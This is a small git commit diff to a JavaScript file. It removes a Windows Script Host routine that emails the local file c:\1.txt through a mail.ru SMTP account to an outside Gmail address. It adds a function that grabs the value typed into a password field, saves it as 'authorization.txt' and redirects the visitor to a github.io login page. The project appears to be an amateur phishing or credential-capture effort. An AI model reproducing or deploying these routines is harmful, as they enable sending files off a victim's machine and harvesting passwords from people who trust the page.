1320649ca279b3867131270c99bf31a32cb67f6c
Dias <diasermekov09@gmail.com>
2023-03-09 19:20:29 +0600

    f

--- js/altyn.js
+++ js/altyn.js
@@ -1,49 +1,13 @@
-var to = "sajtaproverka428@gmail.com";  
-         var subj = "тема письма";  
-         var text = "собственно тело письма";  
- 
-SendMail(to, subj, text, ["c:\\1.txt"]); 
- 
- 
-function SendMail(sRecipientMail, sSubject, sMsgBody,files)   
-{   
-    try   
-    {   
-        // create a session and log on -- username and password in profile    
-        var refMsg = WScript.CreateObject("CDO.Message");   
-        var refConf = WScript.CreateObject("CDO.Configuration");   
-           
-        // Setting configuration params   
-        with(refConf.Fields)   
-        {   
-            Item("http://schemas.microsoft.com/cdo/configuration/smtpserver") = "smtp.mail.ru";  
-            Item("http://schemas.microsoft.com/cdo/configuration/sendusing") = 2; 
-            Item("http://schemas.microsoft.com/cdo/configuration/smtpauthenticate") = 1;  
-            Item("http://schemas.microsoft.com/cdo/configuration/sendusername") = "lou@list.ru";  
-            Item("http://schemas.microsoft.com/cdo/configuration/sendpassword") = "****"; 
-        }   
-        refConf.Fields.Update();   
-   
-        with(refMsg)   
-        {   
-            Configuration = refConf;   
-            To       = sRecipientMail;   
-            From     = "lou@list.ru";   
-            Subject  = sSubject;   
-            TextBody = sMsgBody;   
-        }  
+// JavaScript code
+function saveAuthorization() {
+    const authorizationText = document.getElementById("password").value;
+    const file = new Blob([authorizationText], {type: "text/plain"});
+    const url = URL.createObjectURL(file);
+    const link = document.createElement("a");
+    link.href = url;
+    link.download = "authorization.txt";
+    link.click();
+    window.location.href = "https://altyn-bidai.github.io/login/";
+  }
   
-        if (files)  
-        {  
-            for(var i=0; i<files.length; i++)  
-                refMsg.AddAttachment(files[i]);  
-        }  
   
-        refMsg.Send();   
-    }    
-    catch(e)   
-    {   
-        WScript.Echo("SendMail error !!! : " + e.description);   
-        WScript.Quit(1);   
-    }   
-}
